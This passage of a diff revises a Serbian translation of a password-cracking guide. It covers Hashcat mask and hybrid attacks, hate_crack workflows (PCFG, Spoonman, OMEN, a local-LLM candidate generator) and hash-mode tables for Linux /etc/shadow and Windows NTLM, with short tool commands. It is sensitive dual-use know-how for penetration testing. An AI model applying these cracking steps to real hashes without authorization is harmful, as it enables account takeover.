-Nemojte normalizovati mask fajlove pomoću generičkih CSV ili tekstualnih parsera. Hashcat podržava prilagođene skupove znakova `?1` do `?8`, tretira `#` kao komentar samo kada je prvi bajt i uklanja escape sekvence sa obrnutom kosom crtom u jednom prolazu, pre tumačenja tokena `?`. Zato su početni razmaci pre `#` deo maske, a escape sekvence mogu promeniti to da li je niz literal ili token skupa znakova.<sup>[[6]](#references)[[9]](#references)</sup>
+Nemojte normalizovati mask fajlove pomoću generičkih CSV ili tekstualnih parsera. Hashcat podržava prilagođene skupove znakova `?1` do `?8`, tretira `#` kao komentar samo kada je prvi bajt, a uklanja escape sekvence u jednom prolazu pre tumačenja tokena `?`. Zato su početni razmaci ispred `#` deo maske, a escape sekvence mogu promeniti to da li je niz doslovan tekst ili token skupa znakova.<sup>[[6]](#references)[[9]](#references)</sup>
 
 - Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) napad
 
@@ -935,9 +941,9 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
 
-#### Hashcat prolazi obučeni za cilj pomoću hate_crack
+#### Hashcat prolazi prilagođeni ciljnoj meti uz hate_crack
 
-[hate_crack](https://github.com/trustedsec/hate_crack) orkestrira lokalne Hashcat prolaze nakon što imate datoteku sa hash vrednostima i znate Hashcat režim. Hashcat morate zasebno da instalirate. Klonirajte repozitorijum sa podmodulima, pokrenite `make`, a zatim započnite interaktivnu sesiju; primer režima `1000` označava NTLM, a ne univerzalnu podrazumevanu vrednost. U postojećim klonovima, pre korišćenja opcija PCFG i PRINCE-LING pokrenite `git submodule update --init --recursive`.<sup>[[13]](#references)[[14]](#references)</sup>
+[hate_crack](https://github.com/trustedsec/hate_crack) pokreće lokalne Hashcat prolaze kada imate datoteku sa hash vrednostima i znate Hashcat režim. Hashcat morate zasebno instalirati. Klonirajte repozitorijum sa podmodulima, pokrenite `make`, a zatim započnite interaktivnu sesiju; primer režima `1000` odnosi se na NTLM, a nije univerzalna podrazumevana vrednost. Ako već imate klon, pokrenite `git submodule update --init --recursive` pre korišćenja opcija PCFG i PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>
 
 ```bash
 git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
@@ -946,7 +952,7 @@ make
 hate_crack hashes.txt 1000
 ```
 
-**Naučite gramatiku iz oporavljenih otvorenih tekstova.** Pokrenite početni prolaz sa rečnikom i pravilima, a zatim obučite `pcfg_cracker` na otvorenim tekstovima relevantnim za cilj. Podesite `pcfgRuleset` u `config.json` na obučeni ruleset i izaberite PCFG (meni `20`) da biste prosleđivali verovatne strukture u Hashcat, ili PRINCE-LING (`21`) da biste napravili početnu listu za PRINCE vođenu gramatikom. Ograničite broj kandidata za oba generatora pomoću `pcfgMaxCandidates` i `pcfgPrinceLingMaxCandidates`; hate_crack ne obučava gramatiku umesto vas. PCFG uči verovatnoću struktura kao što su osnovna reč praćena ciframa i simbolima, za razliku od fiksne gramatike u [primeru napada kombinatorom](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>
+**Naučite gramatiku iz oporavljenih tekstova u otvorenom obliku.** Pokrenite početni prolaz kroz rečnik i pravila, a zatim obučite `pcfg_cracker` na tekstovima u otvorenom obliku relevantnim za cilj. U `config.json` postavite `pcfgRuleset` na obučeni skup pravila i izaberite PCFG (meni `20`) da biste prosleđivali verovatne strukture u Hashcat ili PRINCE-LING (`21`) da biste napravili osnovnu PRINCE listu vođenu gramatikom. Ograničite broj kandidata koje generišu ova dva alata pomoću `pcfgMaxCandidates` i `pcfgPrinceLingMaxCandidates`; hate_crack ne obučava gramatiku umesto vas. PCFG uči verovatnoću struktura kao što su osnovna reč praćena ciframa i simbolima, za razliku od fiksne gramatike u [primeru napada kombinatorom vođenog gramatikom](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>
 
 ```bash
 cd pcfg_cracker
@@ -956,17 +962,17 @@ cd ..
 hate_crack hashes.txt 1000
 ```
 
-**Izvedite pravila unazad iz poznatih lozinki.** Spoonman (meni `22`) prima korpus otvorenog teksta, uključujući nepraznu `.out` datoteku trenutne sesije, i izvodi osnovne reči sastavljene od malih slova plus Hashcat pravila koja rekonstruišu uočene lozinke. Rangira pravila prema broju lozinki iz korpusa koje reprodukuju. Počnite od nivoa koji pokriva 50% najčešćih lozinki i proširite ga samo ako je dodatni keyspace opravdan; kombinujte izvedene osnovne reči sa drugim relevantnim listama reči kada pokrivenost ograničava nedostajuća osnova, a ne mutacija. Hashcat prihvata najviše 31 funkciju po pravilu, a njegov alfabet pozicija obuhvata samo indekse `0`–`35`; kada lozinka ne može da se kodira, Spoonman koristi doslovnu osnovnu reč i no-op pravilo. Veoma veliki korpusi mogu dostići ograničenje njegovog brojača sa ograničenom memorijom, zato proverite prijavljenu pokrivenost umesto da pretpostavite potpunu rekonstrukciju. Pre nego što nezavisno ponovo upotrebite izlaz, pogledajte [ponašanje Hashcat pravila](#explain-and-profile-rule-files).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+**Izvedi pravila unazad iz poznatih lozinki.** Spoonman (meni `22`) uzima korpus otvorenog teksta, uključujući nepraznu `.out` datoteku trenutne sesije, i izvodi osnovne reči sastavljene od malih slova, kao i Hashcat rules koji rekonstrušu uočene lozinke. Rangira rules prema broju lozinki iz korpusa koje reprodukuju. Počni od nivoa koji pokriva 50% najčešćih lozinki i proširi ga samo ako je dodatni keyspace opravdan; kombinuj izvedene osnovne reči s drugim relevantnim wordlist-ovima kada pokrivenost ograničava nedostajuća osnova, a ne mutacija. Hashcat prihvata najviše 31 funkciju po rule-u, a njegova abeceda pozicija obuhvata samo indekse `0`–`35`; kada lozinka ne može da se kodira, Spoonman koristi doslovnu osnovnu reč i no-op rule. Veoma veliki korpusi mogu dostići ograničenje brojača sa ograničenom memorijom, zato proveri prijavljenu pokrivenost umesto da pretpostaviš potpunu rekonstrukciju. Pre samostalnog ponovnog korišćenja izlaza, pogledaj [ponašanje Hashcat rules](#explain-and-profile-rule-files).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
 
-**Izaberite generator prema dostupnim dokazima.** OMEN (`13`) obučava model prelaza između znakova na osnovu liste lozinki i enumeriše kandidate po verovatnoći, uz ograničenje `omenMaxCandidates`. Markov brute force (`15`) može umesto toga da napravi `.hcstat2` tabelu iz trenutnih `.out` pogodaka ili izabrane liste i testira inkrementalni opseg dužina. Kada su obaveštajni podaci o meti u obliku proze, a ne lozinki, N-gram (`16`) prosleđuje korpus, uključujući gzip ulaz, u `ngramX.bin`; podrazumevana veličina grupe je tri. Ovo su alternative, a ne tri kopije iste liste kandidata.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>
+**Izaberi generator prema dostupnim dokazima.** OMEN (`13`) obučava model prelaza između znakova na listi lozinki i generiše kandidate po redosledu verovatnoće, do ograničenja `omenMaxCandidates`. Markov brute force (`15`) umesto toga može da napravi `.hcstat2` tabelu iz trenutno razbijenih lozinki u `.out` datoteci ili iz izabrane liste, pa da testira inkrementalni raspon dužina. Kada su informacije o cilju u obliku proze, a ne lozinki, N-gram (`16`) prosleđuje korpus, uključujući gzip ulaz, u `ngramX.bin`; podrazumevana veličina grupe je tri. Ovo su alternative, a ne tri kopije iste liste kandidata.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>
 
-**Proširujte samo male, verovatne skupove.** Permutation (`17`) menja redosled svih znakova u svakoj ulaznoj reči, pa i jedna reč od osam znakova daje `8!` permutacija. Combipow (`19`) emituje neprazne kombinacije podskupova iz malog skupa reči za passphrase; `-s` umeće razmake, a alat odbija više od 63 ulazna reda. Combinator (`6`) može da spaja više lista reči pomoću separatora preko `--sepFill`; obično spajanje dveju lista obuhvata [native Hashcat combinator](#hashcat-attacks) iznad.<sup>[[13]](#references)[[14]](#references)</sup>
+**Proširuj samo male, verovatne skupove.** Permutation (`17`) menja redosled svih znakova u svakoj ulaznoj reči, tako da čak i jedna reč od osam znakova daje `8!` redosleda. Combipow (`19`) generiše neprazne kombinacije podskupova iz kratkog skupa reči za passphrase; `-s` umeće razmake, a alat odbacuje više od 63 ulazna reda. Combinator (`6`) može da spoji više wordlist-ova koristeći separatore preko `--sepFill`; obično spajanje dve liste pokriveno je [nativnim Hashcat combinator napadom](#hashcat-attacks) iznad.<sup>[[13]](#references)[[14]](#references)</sup>
 
-**Odmerite napade sa povratnom spregom.** Fingerprint (`5`) iterativno proširuje novootkrivene lozinke uz postepeno povećavanje dužine fragmenata, umesto da u svakom krugu ponovo proširuje ceo korpus; njegov prag keyspace-a kombinovanja preskače preveliki prolaz `-a 1`. Hybrid (`7`) prvo isprobava jeftinije dodatke `?s?d`, pa zatim šire prepend/append maske `?a`, pri čemu trajanje pokretanja ograničava `hcatHybridMaxRuntime`. Ovo je važno zato što je cena hibridnog prolaza jednaka veličini liste reči pomnoženoj prostorom maski, pa široka maska nad velikom listom može višestruko premašiti početne prolaze.<sup>[[13]](#references)[[14]](#references)</sup>
+**Ograniči povratne napade.** Fingerprint (`5`) iterativno proširuje novorazbijene lozinke rastućom dužinom fragmenata, umesto da u svakom krugu ponovo proširuje ceo korpus; njegov prag za keyspace kombinacija preskače preveliki prolaz `-a 1`. Hybrid (`7`) prvo isprobava jeftinije dekoracije `?s?d`, a zatim šire prepend/append maske `?a`, pri čemu `hcatHybridMaxRuntime` ograničava trajanje pokretanja. Ovo je važno jer je cena hibridnog prolaza jednaka veličini wordlist-a pomnoženoj prostorom maske, pa široka maska nad velikom listom može znatno da nadmaši početne prolaze.<sup>[[13]](#references)[[14]](#references)</sup>
 
-**Generišite kandidate iz oporavljenih lozinki pomoću lokalnog LLM-a.** Nakon što početni prolaz napravi nepraznu datoteku `<hashfile>.out`, hate_crack-ov LLM napad (glavni meni `12`, podmeni **Cracked passwords** `3`) može da zaključi koje su osnovne reči, godine, sufiksi i velika/mala slova specifični za metu, pa da prosledi nove kandidate programu Hashcat. Mali korpusi mogu da uključe oporavljene otvorene tekstove u prompt modela; veći korpusi se umesto toga sažimaju u statistike. Ovaj pristup uopštava uočene obrasce, umesto da samo ponavlja fiksna [pravila](#explain-and-profile-rule-files) ili [maske](#hashcat-attacks) iznad.<sup>[[13]](#references)[[14]](#references)</sup>
+**Generiši kandidate iz oporavljenih lozinki pomoću lokalnog LLM-a.** Nakon što početni prolaz napravi nepraznu datoteku `<hashfile>.out`, LLM napad u hate_crack-u (glavni meni `12`, podmeni **Cracked passwords** `3`) može da zaključi osnovne reči specifične za cilj, godine, sufikse i velika/mala slova, a zatim prosledi nove kandidate Hashcat-u. Mali korpusi mogu da uključe oporavljene tekstualne lozinke u prompt modela; veći korpusi se umesto toga sažimaju u statistiku. Ovim se uopštavaju uočene konvencije, umesto da se samo ponavljaju gore navedeni fiksni [rules](#explain-and-profile-rule-files) ili [masks](#hashcat-attacks).<sup>[[13]](#references)[[14]](#references)</sup>
 
-Konfigurišite već pokrenut lokalni Ollama model u hate_crack-ovoj datoteci `.env`; alat neće automatski preuzeti model. `OLLAMA_NO_CLOUD=true` odbija modele označene kao cloud i adrese udaljenih endpoint-a. Sam endpoint na localhost adresi nije dovoljan: Ollama može udaljeno da prosleđuje zahteve modelu `-cloud`, a promptovi mogu da sadrže oporavljene otvorene tekstove ili statistike korpusa. Ovo podešavanje i dalje dozvoljava endpoint-e u privatnoj mreži i ne može da isključi posrednički server za prenos, zato proverite putanju inferencije pre slanja podataka klijenta.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
+Podesi već pokrenuti lokalni Ollama model u hate_crack-ovoj `.env` datoteci; model se ne preuzima automatski. `OLLAMA_NO_CLOUD=true` odbacuje modele označene kao cloud i adrese udaljenih endpoint-a. Sam localhost endpoint nije dovoljan: Ollama može udaljeno da posreduje za `-cloud` model, a promptovi mogu da sadrže oporavljene tekstualne lozinke ili statistiku korpusa. Ovo podešavanje i dalje dozvoljava endpoint-e na privatnoj mreži i ne može da isključi transportni proxy, zato proveri putanju obrade pre slanja podataka klijenta.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
 
 ```dotenv
 LLM_BACKEND=ollama
@@ -980,15 +986,15 @@ hate_crack hashes.txt 1000
 # Select 12 (LLM Attack), then 3 (Cracked passwords).
 ```
 
-Uporedite učinak kandidata sa jeftinijim prolazima pomoću pravila, maski i modela treniranih na ciljnom skupu pre nego što izdvojite veći budžet. Model generiše pretpostavke; Hashcat ih i dalje proverava u odnosu na hash vrednosti.<sup>[[13]](#references)[[14]](#references)</sup>
+Uporedite broj pogodaka sa jeftinijim prolazima pomoću pravila, maski i modela obučenog na ciljnom skupu pre nego što izdvojite veći budžet. Model generiše pogađanja; Hashcat ih i dalje proverava u odnosu na hash vrednosti.<sup>[[13]](#references)[[14]](#references)</sup>
 
-#### Hashcat modes
+#### Hashcat režimi
 
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 
-Cracking Linux heševa - /etc/shadow datoteka
+Razbijanje Linux hashova - datoteka /etc/shadow
 
 ```
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
@@ -997,14 +1003,14 @@ Cracking Linux heševa - /etc/shadow datoteka
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
 
-Razbijanje Windows hash-eva
+Cracking Windows hash-eva
 
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
 
-Razbijanje hash-eva uobičajenih aplikacija
+Probijanje uobičajenih hashova aplikacija
 
 ```
   900 | MD4                                              | Raw Hash
@@ -1018,19 +1024,19 @@ Razbijanje hash-eva uobičajenih aplikacija
 
 ## References
 
-- [1] [Inside GoBruteforcer: podrazumevane vrednosti servera generisane pomoću AI-ja, slabe lozinke i kampanje usmerene na kriptovalute](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [Unutar GoBruteforcer-a: podrazumevane postavke servera generisane pomoću AI-ja, slabe lozinke i kampanje usmerene na kriptovalute](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 - [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
-- [3] [Primeri hash vrednosti za Hashcat i režimi za Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
-- [4] [Combinator attack u Hashcat-u](https://hashcat.net/wiki/doku.php?id=combinator_attack)
-- [5] [Planiranje nasleđivanja akreditiva](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
-- [6] [Repozitorijum HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
-- [7] [Implementacija debug fajla u Hashcat-u](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
-- [8] [Pomoć za komandnu liniju Hashcat-a](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
-- [9] [HashcatRosetta: čitanje Kamena iz Rozete za razbijanje lozinki](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
-- [10] [Repozitorijum PCFG Cracker-a i uputstvo za korišćenje](https://github.com/lakiw/pcfg_cracker)
-- [11] [Repozitorijum OMEN-a i korisničko uputstvo](https://github.com/RUB-SysSec/OMEN)
-- [12] [Originalni issue za Spoonman i dizajn izvođenja pravila](https://github.com/trustedsec/hate_crack/issues/169)
-- [13] [Repozitorijum hate_crack-a i dokumentacija napada](https://github.com/trustedsec/hate_crack)
-- [14] [Šta je novo u hate_crack-u od verzije 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
-- [15] [Pravila odredišta za LLM u hate_crack-u](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
+- [3] [Hashcat primeri hash vrednosti i režimi za Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- [4] [Hashcat combinator attack](https://hashcat.net/wiki/doku.php?id=combinator_attack)
+- [5] [Planiranje nasleđivanja pristupnih podataka](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [6] [HashcatRosetta repozitorijum](https://github.com/bandrel/HashcatRosetta)
+- [7] [Implementacija Hashcat debug datoteke](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
+- [8] [Pomoć za Hashcat komandnu liniju](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
+- [9] [HashcatRosetta: Čitanje kamena iz Rozete razbijanja lozinki](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
+- [10] [PCFG Cracker repozitorijum i upotreba](https://github.com/lakiw/pcfg_cracker)
+- [11] [OMEN repozitorijum i korisničko uputstvo](https://github.com/RUB-SysSec/OMEN)
+- [12] [Spoonman izvorni problem i dizajn izvođenja pravila](https://github.com/trustedsec/hate_crack/issues/169)
+- [13] [hate_crack repozitorijum i dokumentacija o napadima](https://github.com/trustedsec/hate_crack)
+- [14] [Šta je novo u hate_crack od verzije 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
+- [15] [hate_crack pravila za odredišta LLM-a](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
 {{#include ../banners/hacktricks-training.md}}
